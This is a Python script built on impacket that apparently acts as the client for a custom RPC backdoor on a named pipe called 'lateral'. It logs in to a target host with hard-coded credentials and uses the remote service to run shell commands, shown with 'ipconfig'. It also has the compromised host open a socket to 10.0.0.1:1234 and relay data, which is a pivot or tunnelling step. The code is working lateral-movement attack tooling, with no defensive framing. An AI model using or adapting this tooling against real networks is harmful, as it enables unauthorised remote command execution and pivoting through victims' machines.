#!/usr/bin/python3
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import transport, scmr
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRULONG, NDRVaryingString, NDRCALL, NDRPOINTER, NDRUniConformantArray, NDRSTRUCT, NDRUniFixedArray
from impacket.dcerpc.v5.dtypes import LPWSTR, LPSTR, STR, SHORT, DWORD, PCHAR, LPBYTE, WSTR, LPDWORD
from impacket.dcerpc.v5.lsad import PCHAR_ARRAY
from impacket.dcerpc.v5.nrpc import UCHAR_ARRAY, PUCHAR_ARRAY
from impacket.dcerpc.v5.wkst import CHAR_ARRAY
from sys import argv
from os import fork
from threading import Thread
from struct import unpack


def msrpc():
    MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
    USERNAME = 'admin'
    PASSWORD = 'qwerty=123'
    DOMAIN = "."

    target = argv[1]
    stringbinding = r'ncacn_np:%s[\pipe\lateral]' % target
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(445)
    rpctransport.setRemoteHost(target)
    rpctransport.set_credentials(USERNAME, PASSWORD, DOMAIN, "", "", None)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(MSRPC_UUID_test)
    return dce

class SC_RPC_HANDLE(NDRSTRUCT):
    structure =  (
        ('Data','20s=""'),
    )
    def getAlignment(self):
        return 1

class DCERPCSessionError(Exception):
    def __init__(self, packet, error_code):
        print(123)
        pass

class Connect(NDRCALL):
    opnum = 0
    structure = (
        ('ip',STR),
        ('port',SHORT),
    )
class ConnectResponse(NDRCALL):
    structure = (
        ('socket',DWORD),
    )

class Disconnect(NDRCALL):
    opnum = 1
    structure = (
        ('socket',DWORD),
    )
class DisconnectResponse(NDRCALL):
    structure = ()

class Send(NDRCALL):
    opnum = 2
    structure = (
        ('socket',DWORD),
        ('data',STR),
        ('len',DWORD),
    )
class SendResponse(NDRCALL):
    structure = (
        ('len',DWORD),
    )

class Recv(NDRCALL):
    opnum = 3
    structure = (
        ('socket',DWORD),
        ('len',DWORD),
    )
class RecvResponse(NDRCALL):
    structure = (
        ('data',CHAR_ARRAY),
        ('len',DWORD),
    )

class Execute(NDRCALL):
    opnum = 4
    structure = (
        ('cmd',STR),
    )
class ExecuteResponse(NDRCALL):
    structure = (
        ('data',LPSTR),
    )


dce = msrpc()
execute = Execute()
execute["cmd"] = "ipconfig\x00"
res = dce.request(execute)
dce.disconnect()
print(str(res["data"], "cp866"))


dce = msrpc()
connect = Connect()
connect["ip"] = "10.0.0.1\x00"
connect["port"] = 1234
res = dce.request(connect, checkError=False)
res.dump()
socket = res["socket"]

send = Send()
send["socket"] = socket
send["data"] = "test\x00"
send["len"] = 4
res = dce.request(send, checkError=False)
res.dump()

while True:
    recv = Recv()
    recv["socket"] = socket
    recv["len"] = 10
    res = dce.call(recv.opnum, recv)
    res = dce.recv()
    length = unpack("<i", res[-4:])[0]
    data = res[ 4 : length+4 ]
    if length == -1:
        continue # waiting data
    elif length == 0:
        break # connection closed
    elif length >= 0:
        break # data recieved
print(data)

disconnect = Disconnect()
disconnect["socket"] = socket
dce.request(disconnect)
dce.disconnect()
